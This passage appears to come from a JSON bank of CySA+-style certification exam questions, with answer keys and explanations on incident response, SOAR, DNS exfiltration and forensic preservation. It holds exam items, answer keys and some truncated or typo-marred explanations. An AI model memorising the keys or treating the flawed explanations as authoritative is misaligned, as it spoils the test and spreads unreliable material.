    "explanation": "Searching for other mail users who have received the same file is the best activity to perform next, as\nit helps to identify and contain the scope of the ransomware attack and prevent further damage.\nRansomware is a type of malware that encrypts files on a system and demands payment for their\ndecryption. Ransomware can spread through phishing emails that contain malicious attachments or\nlinks that download the ransomware. By searching for other mail users who have received the same\nfile, the analyst can alert them not to open it, delete it from their inboxes, and scan their systems for\nany signs of infection. The other activities are not as urgent or effective as searching for other mail\nusers who have received the same file, as they do not address the immediate threat of ransomware\nspreading or affecting more systems. Wiping the computer and reinstalling software may restore the\nfunctionality of the affected workstation, but it will also erase any evidence of the ransomware attack\nand make recovery of encrypted files impossible. Shutting down the email server and quarantining it\nfrom the network may stop the delivery of more phishing emails, but it will also disrupt normal\ncommunication and operations for the organization. Acquiring a bit-level image of the affected\nworkstation may preserve the evidence of the ransomware attack, but it will not help to stop or\nremove the ransomware or decrypt the files.",
    "image": null
  },
  {
    "id": "q-jc-86",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An organization recently changed its BC and DR plans. Which of the following would best allow for\nthe incident response team to test the changes without any impact to the business?",
    "options": [
      "A. Perform a tabletop drill based on previously identified incident scenarios.",
      "B. Simulate an incident by shutting down power to the primary data center.",
      "C. Migrate active workloads from the primary data center to the secondary location.",
      "D. Compare the current plan to lessons learned from previous incidents."
    ],
    "answer": "A",
    "explanation": "Performing a tabletop drill based on previously identified incident scenarios is the best way to test\nthe changes to the BC and DR plans without any impact to the business, as it is a low-cost and low-\nrisk method of exercising the plans and identifying any gaps or issues. A tabletop drill is a type of\nBC/DR exercise that involves gathering key personnel from different departments and roles and\ndiscussing how they would respond to a hypothetical incident scenario. A tabletop drill does not\ninvolve any actual simulation or disruption of the systems or processes, but rather relies on verbal\ncommunication and documentation review. A tabletop drill can help to ensure that everyone is\nfamiliar with the BC/DR plans, that the plans reflect the current state of the organization, and that\nthe plans are consistent and coordinated across different functions. The other options are not as\nsuitable as performing a tabletop drill, as they involve more cost, risk, or impact to the business.\nSimulating an incident by shutting down power to the primary data center is a type of BC/DR exercise\nthat involves creating an actual disruption or outage of a critical system or process, and observing\nhow the organization responds and recovers. This type of exercise can provide a realistic assessment\nof the BC/DR capabilities, but it can also cause significant impact to the business operations,\ncustomers, and reputation. Migrating active workloads from the primary data center to the\nsecondary location is a type of BC/DR exercise that involves switching over from one system or site to\nanother, and verifying that the backup system or site can support the normal operations. This type of\nexercise can help to validate the functionality and performance of the backup system or site, but it\ncan also incur high costs, complexity, and potential errors or failures. Comparing the current plan to\nlessons learned from previous incidents is a type of BC/DR activity that involves reviewing past\nexperiences and outcomes, and identifying best practices or improvement opportunities. This\nactivity can help to update and refine the BC/DR plans, but it does not test or validate them in a\nsimulated or actual scenario",
    "image": null
  },
  {
    "id": "q-jc-87",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An end-of-life date was announced for a widely used OS. A business-critical function is performed by\nsome machinery that is controlled by a PC, which is utilizing the OS that is approaching the end-of-\nlife date. Which of the following best describes a security analyst's concern?",
    "options": [
      "A. Any discovered vulnerabilities will not be remediated.",
      "B. An outage of machinery would cost the organization money.",
      "C. Support will not be available for the critical machinery",
      "D. There are no compensating controls in place for the OS."
    ],
    "answer": "A",
    "explanation": "A security analyst’s concern is that any discovered vulnerabilities in the OS that is approaching the\nend-of-life date will not be remediated by the vendor, leaving the system exposed to potential\nattacks. The other options are not directly related to the security analyst’s role or responsibility.\nVerified Reference: CompTIA Cybersecurity Analyst (CySA+) Certification Exam Objectives, page 9,\nsection 2.21",
    "image": "images/page_54_img_2.jpeg"
  },
  {
    "id": "q-jc-88",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A cloud team received an alert that unauthorized resources were being auto-provisioned. After\ninvestigating, the team suspects that crypto mining is occurring. Which of the following indicators\nwould\nmost likely lead the team to this conclusion?\n.",
    "options": [
      "A. High GPU utilization",
      "B. Bandwidth consumption",
      "C. Unauthorized changes",
      "D. Unusual traffic spikes"
    ],
    "answer": "A",
    "explanation": "High GPU utilization is the most likely indicator that cryptomining is occurring, as it reflects the\nintensive computational work that is required to solve the complex mathematical problems involved\nin mining cryptocurrencies. Cryptomining is the process of generating new units of a cryptocurrency\nby using computing power to verify transactions and create new blocks on the blockchain.\nCryptomining can be done legitimately by individuals or groups who participate in a mining pool and\nshare the rewards, or illegitimately by threat actors who use malware or scripts to hijack the\ncomputing resources of unsuspecting victims and use them for their own benefit. This practice is\ncalled cryptojacking, and it can cause performance degradation, increased power consumption, and\nsecurity risks for the affected systems. Cryptomining typically relies on the GPU (graphics processing\nunit) rather than the CPU (central processing unit), as the GPU is better suited for parallel processing\nand can handle more calculations per second. Therefore, a high GPU utilization rate can be a sign\nthat cryptomining is taking place on a system, especially if there is no other explanation for the\nincreased workload. The other options are not as indicative of cryptomining as high GPU utilization,\nas they can have other causes or explanations. Bandwidth consumption can be affected by many\nfactors, such as network traffic, streaming services, downloads, or updates. It is not directly related\nto cryptomining, which does not require a lot of bandwidth to communicate with the mining pool or\nthe blockchain network. Unauthorized changes can be a result of many types of malware or\ncyberattacks, such as ransomware, spyware, or trojans. They are not specific to cryptomining, which\ndoes not necessarily alter any files or settings on the system, but rather uses its processing power.\nUnusual traffic spikes can also be caused by various factors, such as legitimate surges in demand,\ndistributed denial-of-service attacks, or botnets. They are not indicative of cryptomining, which does\nnot generate a lot of traffic or requests to or from the system.",
    "image": "images/page_54_img_2.jpeg"
  },
  {
    "id": "q-jc-89",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst receives an alert for suspicious activity on a company laptop An excerpt of the log\nis shown below:\nWhich of the following has most likely occurred?",
    "options": [
      "A.\nAn Office document with a malicious macro was opened.",
      "B.\nA credential-stealing website was visited.",
      "C.\nA phishing link in an email was clicked",
      "D.\nA web browser vulnerability was exploited."
    ],
    "answer": "A",
    "explanation": "An Office document with a malicious macro was opened is the most likely explanation for the\nsuspicious activity on the company laptop, as it reflects the common technique of using macros to\nexecute PowerShell commands that download and run malware. A macro is a piece of code that can\nautomate tasks or perform actions in an Office document, such as a Word file or an Excel\nspreadsheet. Macros can be useful and legitimate, but they can also be abused by threat actors to\ndeliver malware or perform malicious actions on the system. A malicious macro can be embedded in\nan Office document that is sent as an attachment in a phishing email or hosted on a compromised\nwebsite. When the user opens the document, they may be prompted to enable macros or content,\nwhich will trigger the execution of the malicious code. The malicious macro can then use PowerShell,\nwhich is a scripting language and command-line shell that is built into Windows, to perform various\ntasks, such as downloading and running malware from a remote URL, bypassing security controls, or\nestablishing persistence on the system. The log excerpt shows that PowerShell was used to download\na string from a URL using the WebClient.DownloadString method, which is a common way to fetch\nand execute malicious code from the internet. The log also shows that PowerShell was used to\ninvoke an expression (iex) that contains obfuscated code, which is another common way to evade\ndetection and analysis. The other options are not as likely as an Office document with a malicious\nmacro was opened, as they do not match the evidence in the log excerpt. A credential-stealing\nwebsite was visited is possible, but it does not explain why PowerShell was used to download and\nexecute code from a URL. A phishing link in an email was clicked is also possible, but it does not\nexplain what happened after the link was clicked or how PowerShell was involved. A web browser\nvulnerability was exploited is unlikely, as it does not explain why PowerShell was used to download\nand execute code from a URL.",
    "image": "images/page_54_img_2.jpeg"
  },
  {
    "id": "q-jc-90",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "During an incident, a security analyst discovers a large amount of Pll has been emailed externally\nfrom an employee to a public email address. The analyst finds that the external email is the\nemployee's\npersonal email. Which of the following should the analyst recommend be done first?",
    "options": [
      "A. Place a legal hold on the employee's mailbox.",
      "B. Enable filtering on the web proxy.",
      "C. Disable the public email access with CASB",
      "D. Configure a deny rule on the firewall."
    ],
    "answer": "A",
    "explanation": "Placing a legal hold on the employee’s mailbox is the best action to perform first, as it preserves all\nmailbox content, including deleted items and original versions of modified items, for potential legal\nor forensic purposes. A legal hold is a feature that allows an administrator to retain mailbox data for\na user indefinitely or for a specified period, regardless of the user’s actions or retention policies. A\nlegal hold can be applied to a mailbox using Litigation Hold or In-Place Hold in Exchange Server or\nExchange Online. A legal hold can help to ensure that evidence of data exfiltration or other malicious\nactivities is not lost or tampered with, and that the organization can comply with any legal or\nregulatory obligations. The other actions are not as urgent or effective as placing a legal hold on the\nemployee’s mailbox, as they do not address the immediate threat of data loss or compromise.\nEnabling filtering on the web proxy may help to prevent some types of data exfiltration or malicious\ntraffic, but it does not help to recover or preserve the data that has already been emailed externally.\nDisabling the public email access with CASB (Cloud Access Security Broker) may help to block or\nmonitor the use of public email services by employees, but it does not help to recover or preserve\nthe data that has already been emailed externally. Configuring a deny rule on the firewall may help\nto block or monitor the network traffic from the employee’s laptop, but it does not help to recover or\npreserve the data that has already been emailed externally.",
    "image": null
  },
  {
    "id": "q-jc-91",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following best describes the document that defines the expectation to network\ncustomers that patching will only occur between 2:00 a.m. and 4:00 a.m.?",
    "options": [
      "A. SLA",
      "B. LOI",
      "C. MOU",
      "D. KPI"
    ],
    "answer": "A",
    "explanation": "SLA (Service Level Agreement) is the best term to describe the document that defines the\nexpectation to network customers that patching will only occur between 2:00 a.m. and 4:00 a.m., as\nit reflects the agreement between a service provider and a customer that specifies the services,\nquality, availability, and responsibilities that are agreed upon. An SLA is a common type of document\nthat is used in various industries and contexts, such as IT, telecom, cloud computing, or outsourcing.\nAn SLA typically includes metrics and indicators to measure the performance and quality of the\nservice, such as uptime, response time, or resolution time. An SLA also defines the consequences or\nremedies for any breaches or failures of the service, such as penalties, refunds, or credits. An SLA can\nhelp to manage customer expectations, formalize communication, improve productivity, and\nstrengthen relationships. The other terms are not as accurate as SLA, as they describe different types\nof documents or concepts. LOI (Letter of Intent) is a document that outlines the main terms and\nconditions of a proposed agreement between two or more parties, before a formal contract is\nsigned. An LOI is usually non-binding and expresses the intention or interest of the parties to enter\ninto a future agreement. An LOI can help to clarify the key points of a deal, facilitate negotiations, or\ndemonstrate commitment. MOU (Memorandum of Understanding) is a document that describes a\nmutual agreement or cooperation between two or more parties, without creating any legal\nobligations or commitments. An MOU is usually more formal than an LOI, but less formal than a\ncontract. An MOU can help to establish a common ground, define roles and responsibilities, or\noutline expectations and goals. KPI (Key Performance Indicator) is a concept that refers to a\nmeasurable value that demonstrates how effectively an organization or individual is achieving its key\nobjectives or goals. A KPI is usually quantifiable and specific, such as revenue growth, customer\nsatisfaction, or employee retention. A KPI can help to track progress, evaluate performance, or\nidentify areas for improvement.",
    "image": null
  },
  {
    "id": "q-jc-92",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following describes the best reason for conducting a root cause analysis?",
    "options": [
      "A. The root cause analysis ensures that proper timelines were documented.",
      "B. The root cause analysis allows the incident to be properly documented for reporting.",
      "C. The root cause analysis develops recommendations to improve the process.",
      "D. The root cause analysis identifies the contributing items that facilitated the event"
    ],
    "answer": "D",
    "explanation": "The root cause analysis identifies the contributing items that facilitated the event is the best reason\nfor conducting a root cause analysis, as it reflects the main goal and benefit of this problem-solving\napproach. A root cause analysis (RCA) is a process of discovering the root causes of problems in order\nto identify appropriate solutions. A root cause is the core issue or factor that sets in motion the\nentire cause-and-effect chain that leads to the problem. A root cause analysis assumes that it is more\neffective to systematically prevent and solve underlying issues rather than just treating symptoms or\nputting out fires. A root cause analysis can be performed using various methods, tools, and\ntechniques that help to uncover the causes of problems, such as events and causal factor analysis,\nchange analysis, barrier analysis, or fishbone diagrams. A root cause analysis can help to improve\nquality, performance, safety, or efficiency by finding and eliminating the sources of problems. The\nother options are not as accurate as the root cause analysis identifies the contributing items that\nfacilitated the event, as they do not capture the essence or value of conducting a root cause analysis.\nThe root cause analysis ensures that proper timelines were documented is a possible outcome or\nbenefit of conducting a root cause analysis, but it is not the best reason for doing so. Documenting\ntimelines can help to establish the sequence of events and actions that led to the problem, but it\ndoes not necessarily identify or address the root causes. The root cause analysis allows the incident\nto be properly documented for reporting is also a possible outcome or benefit of conducting a root\ncause analysis, but it is not the best reason for doing so. Documenting and reporting incidents can\nhelp to communicate and share information about problems and solutions, but it does not\nnecessarily identify or address the root causes. The root cause analysis develops recommendations\nto improve the process is another possible outcome or benefit of conducting a root cause analysis,\nbut it is not the best reason for doing so. Developing recommendations can help to implement\nsolutions and prevent future problems, but it does not necessarily identify or address the root\ncauses.",
    "image": null
  },
  {
    "id": "q-jc-93",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "An analyst recommends that an EDR agent collect the source IP address, make a connection to the\nfirewall, and create a policy to block the malicious source IP address across the entire network\nautomatically. Which of the following is the best option to help the analyst implement this\nrecommendation?",
    "options": [
      "A. SOAR",
      "B. SIEM",
      "C. SLA",
      "D. IoC"
    ],
    "answer": "A",
    "explanation": "SOAR (Security Orchestration, Automation, and Response) is the best option to help the analyst\nimplement the recommendation, as it reflects the software solution that enables security teams to\nintegrate and coordinate separate tools into streamlined threat response workflows and automate\nrepetitive tasks. SOAR is a term coined by Gartner in 2015 to describe a technology that combines\nthe functions of security incident response platforms, security orchestration and automation\nplatforms, and threat intelligence platforms in one offering. SOAR solutions help security teams to\ncollect inputs from various sources, such as EDR agents, firewalls, or SIEM systems, and perform\nanalysis and triage using a combination of human and machine power. SOAR solutions also allow\nsecurity teams to define and execute incident response procedures in a digital workflow format,\nusing automation to perform low-level tasks or actions, such as blocking an IP address or\nquarantining a device. SOAR solutions can help security teams to improve efficiency, consistency, and\nscalability of their operations, as well as reduce mean time to detect (MTTD) and mean time to\nrespond (MTTR) to threats. The other options are not as suitable as SOAR, as they do not match the\ndescription or purpose of the recommendation. SIEM (Security Information and Event Management)\nis a software solution that collects and analyzes data from various sources, such as logs, events, or\nalerts, and provides security monitoring, threat detection, and incident response capabilities. SIEM\nsolutions can help security teams to gain visibility, correlation, and context of their security data, but\nthey do not provide automation or orchestration features like SOAR solutions. SLA (Service Level\nAgreement) is a document that defines the expectations and responsibilities between a service\nprovider and a customer, such as the quality, availability, or performance of the service. SLAs can\nhelp to manage customer expectations, formalize communication, and improve productivity and\nrelationships, but they do not help to implement technical recommendations like SOAR solutions.\nIoC (Indicator of Compromise) is a piece of data or evidence that suggests a system or network has\nbeen compromised by a threat actor, such as an IP address, a file hash, or a registry key. IoCs can help\nto identify and analyze malicious activities or incidents, but they do not help to implement response\nactions like SOAR solutions.",
    "image": null
  },
  {
    "id": "q-jc-94",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An attacker has just gained access to the syslog server on a LAN. Reviewing the syslog entries has\nallowed the attacker to prioritize possible next targets. Which of the following is this an example of?",
    "options": [
      "A. Passive network foot printing",
      "B. OS fingerprinting",
      "C. Service port identification",
      "D. Application versioning"
    ],
    "answer": "A",
    "explanation": "Passive network foot printing is the best description of the example, as it reflects the technique of\ncollecting information about a network or system by monitoring or sniffing network traffic without\nsending any packets or interacting with the target. Foot printing is a term that refers to the process of\ngathering information about a target network or system, such as its IP addresses, open ports,\noperating systems, services, or vulnerabilities. Foot printing can be done for legitimate purposes,\nsuch as penetration testing or auditing, or for malicious purposes, such as reconnaissance or\nintelligence gathering. Foot printing can be classified into two types: active and passive. Active foot\nprinting involves sending packets or requests to the target and analyzing the responses, such as using\ntools like ping, traceroute, or Nmap. Active foot printing can provide more accurate and detailed\ninformation, but it can also be detected by firewalls or intrusion detection systems (IDS). Passive foot\nprinting involves observing or capturing network traffic without sending any packets or requests to\nthe target, such as using tools like tcpdump, Wireshark, or Shodan. Passive foot printing can provide\nless information, but it can also avoid detection by firewalls or IDS. The example in the question\nshows that the attacker has gained access to the syslog server on a LAN and reviewed the syslog\nentries to prioritize possible next targets. A syslog server is a server that collects and stores log\nmessages from various devices or applications on a network. A syslog entry is a record of an event or\nactivity that occurred on a device or application, such as an error, a warning, or an alert. By reviewing\nthe syslog entries, the attacker can obtain information about the network or system, such as its\nconfiguration, status, performance, or security issues. This is an example of passive network foot\nprinting, as the attacker is not sending any packets or requests to the target, but rather observing or\ncapturing network traffic from the syslog server. The other options are not correct, as they describe\ndifferent techniques or concepts. OS fingerprinting is a technique of identifying the operating system\nof a target by analyzing its responses to certain packets or requests, such as using tools like Nmap or\nXprobe2. OS fingerprinting can be done actively or passively, but it is not what the attacker is doing in\nthe example. Service port identification is a technique of identifying the services running on a target\nby scanning its open ports and analyzing its responses to certain packets or requests, such as using\ntools like Nmap or Netcat. Service port identification can be done actively or passively, but it is not\nwhat the attacker is doing in the example. Application versioning is a concept that refers to the\nprocess of assigning unique identifiers to different versions of an application, such as using numbers,\nletters, dates, or names. Application versioning can help to track changes, updates, bugs, or features\nof an application, but it is not related to what the attacker is doing in the example.",
    "image": null
  },
  {
    "id": "q-jc-95",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following concepts is using an API to insert bulk access requests from a file into an\nidentity management system an example of?",
    "options": [
      "A. Command and control",
      "B. Data enrichment",
      "C. Automation",
      "D. Single sign-on"
    ],
    "answer": "C",
    "explanation": "Automation is the best concept to describe the example, as it reflects the use of technology to\nperform tasks or processes without human intervention. Automation can help to improve efficiency,\naccuracy, consistency, and scalability of various operations, such as identity and access management\n(IAM). IAM is a security framework that enables organizations to manage the identities and access\nrights of users and devices across different systems and applications. IAM can help to ensure that\nonly authorized users and devices can access the appropriate resources at the appropriate time and\nfor the appropriate purpose. IAM can involve various tasks or processes, such as authentication,\nauthorization, provisioning, deprovisioning, auditing, or reporting. Automation can help to simplify\nand streamline these tasks or processes by using software tools or scripts that can execute\npredefined actions or workflows based on certain triggers or conditions. For example, automation\ncan help to create, update, or delete user accounts in bulk based on a file or a database, rather than\nmanually entering or modifying each account individually. The example in the question shows that\nan API is used to insert bulk access requests from a file into an identity management system. An API\n(Application Programming Interface) is a set of rules or specifications that defines how different\nsoftware components or systems can communicate and exchange data with each other. An API can\nhelp to enable automation by providing a standardized and consistent way to access and manipulate\ndata or functionality of a software component or system. The example in the question shows that an\nAPI is used to automate the process of inserting bulk access requests from a file into an identity\nmanagement system, rather than manually entering each request one by one. The other options are\nnot correct, as they describe different concepts or techniques. Command and control is a term that\nrefers to the ability of an attacker to remotely control a compromised system or device, such as using\nmalware or backdoors. Command and control is not related to what is described in the example.\nData enrichment is a term that refers to the process of enhancing or augmenting existing data with\nadditional information from external sources, such as adding demographic or behavioral attributes to\ncustomer profiles. Data enrichment is not related to what is described in the example. Single sign-on\nis a term that refers to an authentication method that allows users to access multiple systems or\napplications with one set of credentials, such as using a single username and password for different\nwebsites or services. Single sign-on is not related to what is described in the example.",
    "image": null
  },
  {
    "id": "q-jc-96",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "After a security assessment was done by a third-party consulting firm, the cybersecurity program\nrecommended integrating DLP and CASB to reduce analyst alert fatigue. Which of the following is the\nbest possible outcome that this effort hopes to achieve?",
    "options": [
      "A. SIEM ingestion logs are reduced by 20%.",
      "B. Phishing alerts drop by 20%.",
      "C. False positive rates drop to 20%.",
      "D. The MTTR decreases by 20%."
    ],
    "answer": "D",
    "explanation": "The MTTR (Mean Time to Resolution) decreases by 20% is the best possible outcome that this effort\nhopes to achieve, as it reflects the improvement in the efficiency and effectiveness of the incident\nresponse process by reducing analyst alert fatigue. Analyst alert fatigue is a term that refers to the\nphenomenon of security analysts becoming overwhelmed, desensitized, or exhausted by the large\nnumber of alerts they receive from various security tools or systems, such as DLP (Data Loss\nPrevention) or CASB (Cloud Access Security Broker). DLP is a security solution that helps to prevent\nunauthorized access, use, or transfer of sensitive data, such as personal information, intellectual\nproperty, or financial records. CASB is a security solution that helps to monitor and control the use of\ncloud-based applications and services, such as SaaS (Software as a Service), PaaS (Platform as a\nService), or IaaS (Infrastructure as a Service). Both DLP and CASB can generate alerts when they\ndetect potential data breaches, policy violations, or malicious activities, but they can also produce\nfalse positives, irrelevant information, or duplicate notifications that can overwhelm or distract the\nsecurity analysts. Analyst alert fatigue can have negative consequences for the security posture and\nperformance of an organization, such as missing or ignoring critical alerts, delaying or skipping\ninvestigations or remediations, making errors or mistakes, or losing motivation or morale. Therefore,\nit is important to reduce analyst alert fatigue and optimize the alert management process by using\nvarious strategies, such as tuning the alert thresholds and rules, prioritizing and triaging the alerts\nbased on severity and context, enriching and correlating the alerts with additional data sources,\nautomating or orchestrating repetitive or low-level tasks or actions, or integrating and consolidating\ndifferent security tools or systems into a unified platform. By reducing analyst alert fatigue and\noptimizing the alert management process, the effort hopes to achieve a decrease in the MTTR, which\nis a metric that measures the average time it takes to resolve an incident from the moment it is\nreported to the moment it is closed. A lower MTTR indicates a faster and more effective incident\nresponse process, which can help to minimize the impact and damage of security incidents, improve\ncustomer satisfaction and trust, and enhance security operations and outcomes. The other options\nare not as relevant or realistic as the MTTR decreases by 20%, as they do not reflect the best possible\noutcome that this effort hopes to achieve. SIEM ingestion logs are reduced by 20% is not a relevant\noutcome, as it does not indicate any improvement in the incident response process or any reduction\nin analyst alert fatigue. SIEM (Security Information and Event Management) is a security solution\nthat collects and analyzes data from various sources, such as logs, events, or alerts, and provides\nsecurity monitoring, threat detection, and incident response capabilities. SIEM ingestion logs are\nrecords of the data that is ingested by the SIEM system from different sources. Reducing SIEM\ningestion logs may imply less data volume or less data sources for the SIEM system, which may not\nnecessarily improve its performance or accuracy. Phishing alerts drop by 20% is not a realistic\noutcome, as it does not depend on the integration of DLP and CASB or any reduction in analyst alert\nfatigue. Phishing alerts are notifications that indicate potential phishing attempts or attacks, such as\nfraudulent emails, websites, or messages that try to trick users into revealing sensitive information\nor installing malware. Phishing alerts can be generated by various security tools or systems, such as\nemail security solutions, web security solutions, endpoint security solutions, or user awareness\ntraining programs. Reducing phishing alerts may imply less phishing attempts or attacks on the\norganization, which may not necessarily be influenced by the integration of DLP and CASB or any\nreduction in analyst alert fatigue. False positive rates drop to 20% is not a realistic outcome",
    "image": null
  },
  {
    "id": "q-jc-97",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An employee accessed a website that caused a device to become infected with invasive malware.\nThe incident response analyst has:\n• created the initial evidence log.\n• disabled the wireless adapter on the device.\n• interviewed the employee, who was unable to identify the website that was accessed\n• reviewed the web proxy traffic logs.\nWhich of the following should the analyst do to remediate the infected device?",
    "options": [
      "A. Update the system firmware and reimage the hardware.",
      "B. Install an additional malware scanner that will send email alerts to the analyst.",
      "C. Configure the system to use a proxy server for Internet access.",
      "D. Delete the user profile and restore data from backup."
    ],
    "answer": "A",
    "explanation": "Updating the system firmware and reimaging the hardware is the best action to perform to\nremediate the infected device, as it helps to ensure that the device is restored to a clean and secure\nstate and that any traces of malware are removed. Firmware is a type of software that controls the\nlow-level functions of a hardware device, such as a motherboard, hard drive, or network card.\nFirmware can be updated or flashed to fix bugs, improve performance, or enhance security.\nReimaging is a process of erasing and restoring the data on a storage device, such as a hard drive or a\nsolid state drive, using an image file that contains a copy of the operating system, applications,\nsettings, and files. Reimaging can help to recover from system failures, data corruption, or malware\ninfections. Updating the system firmware and reimaging the hardware can help to remediate the\ninfected device by removing any malicious code or configuration changes that may have been made\nby the malware, as well as restoring any missing or damaged files or settings that may have been\naffected by the malware. This can help to prevent further damage, data loss, or compromise of the\ndevice or the network. The other actions are not as effective or appropriate as updating the system\nfirmware and reimaging the hardware, as they do not address the root cause of the infection or\nensure that the device is fully cleaned and secured. Installing an additional malware scanner that will\nsend email alerts to the analyst may help to detect and remove some types of malware, but it may\nnot be able to catch all malware variants or remove them completely. It may also create conflicts or\nperformance issues with other security tools or systems on the device. Configuring the system to use\na proxy server for Internet access may help to filter or monitor some types of malicious traffic or\nrequests, but it may not prevent or remove malware that has already infected the device or that uses\nother methods of communication or propagation. Deleting the user profile and restoring data from\nbackup may help to recover some data or settings that may have been affected by the malware, but\nit may not remove malware that has infected other parts of the system or that has persisted on the\ndevice.",
    "image": null
  },
  {
    "id": "q-jc-98",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A SOC analyst recommends adding a layer of defense for all endpoints that will better protect against\nexternal threats regardless of the device's operating system. Which of the following best meets this\nrequirement?",
    "options": [
      "A. SIEM",
      "B. CASB",
      "C. SOAR",
      "D. EDR"
    ],
    "answer": "D",
    "explanation": "EDR stands for Endpoint Detection and Response, which is a layer of defense that monitors endpoints\nfor malicious activity and provides automated or manual response capabilities. EDR can protect\nagainst external threats regardless of the device’s operating system, as it can detect and respond to\nattacks based on behavioral analysis and threat intelligence. EDR is also one of the tools that\nCompTIA CySA+ covers in its exam objectives. Official Reference:\nhttps://www.comptia.org/certifications/cybersecurity-analyst\nhttps://www.comptia.org/blog/the-new-comptia-cybersecurity-analyst-your-questions-answered\nhttps://resources.infosecinstitute.com/certification/cysa-plus-ia-levels/",
    "image": null
  },
  {
    "id": "q-jc-99",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst has found the following suspicious DNS traffic while analyzing a packet capture:\n• DNS traffic while a tunneling session is active.\n• The mean time between queries is less than one second.\n• The average query length exceeds 100 characters.\nWhich of the following attacks most likely occurred?",
    "options": [
      "A. DNS exfiltration",
      "B. DNS spoofing",
      "C. DNS zone transfer",
      "D. DNS poisoning"
    ],
    "answer": "A",
    "explanation": "DNS exfiltration is a technique that uses the DNS protocol to transfer data from a compromised\nnetwork or device to an attacker-controlled server. DNS exfiltration can bypass firewall rules and\nsecurity products that do not inspect DNS traffic. The characteristics of the suspicious DNS traffic in\nthe question match the indicators of DNS exfiltration, such as:\nDNS traffic while a tunneling session is active: This implies that the DNS protocol is being used to\ncreate a covert channel for data transfer.\nThe mean time between queries is less than one second: This implies that the DNS queries are being\nsent at a high frequency to maximize the amount of data transferred.\nThe average query length exceeds 100 characters: This implies that the DNS queries are encoding\nlarge amounts of data in the subdomains or other fields of the DNS packets.\nOfficial Reference:\nhttps://partners.comptia.org/docs/default-source/resources/comptia-cysa-cs0-002-exam-objectives\nhttps://resources.infosecinstitute.com/topic/bypassing-security-products-via-dns-data-exfiltration/\nhttps://www.reddit.com/r/CompTIA/comments/nvjuzt/dns_exfiltration_explanation/",
    "image": null
  },
  {
    "id": "q-jc-100",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A managed security service provider is having difficulty retaining talent due to an increasing\nworkload caused by a client doubling the number of devices connected to the network. Which of the\nfollowing\nwould best aid in decreasing the workload without increasing staff?",
    "options": [
      "A. SIEM",
      "B. XDR",
      "C. SOAR",
      "D. EDR"
    ],
    "answer": "C",
    "explanation": "SOAR stands for Security Orchestration, Automation and Response, which is a set of features that can\nhelp security teams manage, prioritize and respond to security incidents more efficiently and\neffectively. SOAR can help decrease the workload without increasing staff by automating repetitive\ntasks, streamlining workflows, integrating different tools and platforms, and providing actionable\ninsights and recommendations. SOAR is also one of the current trends that CompTIA CySA+ covers in\nits exam objectives. Official Reference:\nhttps://www.comptia.org/blog/the-new-comptia-cybersecurity-analyst-your-questions-answered\nhttps://www.comptia.org/certifications/cybersecurity-analyst\nhttps://partners.comptia.org/docs/default-source/resources/comptia-cysa-cs0-002-exam-objectives",
    "image": null
  },
  {
    "id": "q-jc-101",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A company is in the process of implementing a vulnerability management program. no-lich of the\nfollowing scanning methods should be implemented to minimize the risk of OT/ICS devices\nmalfunctioning due to the vulnerability identification process?",
    "options": [
      "A. Non-credentialed scanning",
      "B. Passive scanning",
      "C. Agent-based scanning",
      "D. Credentialed scanning"
    ],
    "answer": "B",
    "explanation": "Passive scanning is a method of vulnerability identification that does not send any packets or probes\nto the target devices, but rather observes and analyzes the network traffic passively. Passive scanning\ncan minimize the risk of OT/ICS devices malfunctioning due to the vulnerability identification\nprocess, as it does not interfere with the normal operation of the devices or cause any network\ndisruption. Passive scanning can also detect vulnerabilities that active scanning may miss, such as\nmisconfigured devices, rogue devices or unauthorized traffic. Official Reference:\nhttps://partners.comptia.org/docs/default-source/resources/comptia-cysa-cs0-002-exam-objectives\nhttps://www.comptia.org/blog/the-new-comptia-cybersecurity-analyst-your-questions-answered\nhttps://www.comptia.org/certifications/cybersecurity-analyst",
    "image": null
  },
  {
    "id": "q-jc-102",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst must preserve a system hard drive that was involved in a litigation request Which\nof the following is the best method to ensure the data on the device is not modified?",
    "options": [
      "A. Generate a hash value and make a backup image.",
      "B. Encrypt the device to ensure confidentiality of the data.",
      "C. Protect the device with a complex password.",
      "D. Perform a memory scan dump to collect residual data."
    ],
    "answer": "A",
    "explanation": "Generating a hash value and making a backup image is the best method to ensure the data on the\ndevice is not modified, as it creates a verifiable copy of the original data that can be used for forensic\nanalysis. Encrypting the device, protecting it with a password, or performing a memory scan dump\ndo not prevent the data from being altered or deleted. Verified Reference: CompTIA CySA+ CS0-002\nCertification Study Guide, page 3291",
    "image": "images/page_66_img_2.jpeg"
  },
  {
    "id": "q-jc-103",
    "type": "mcq",
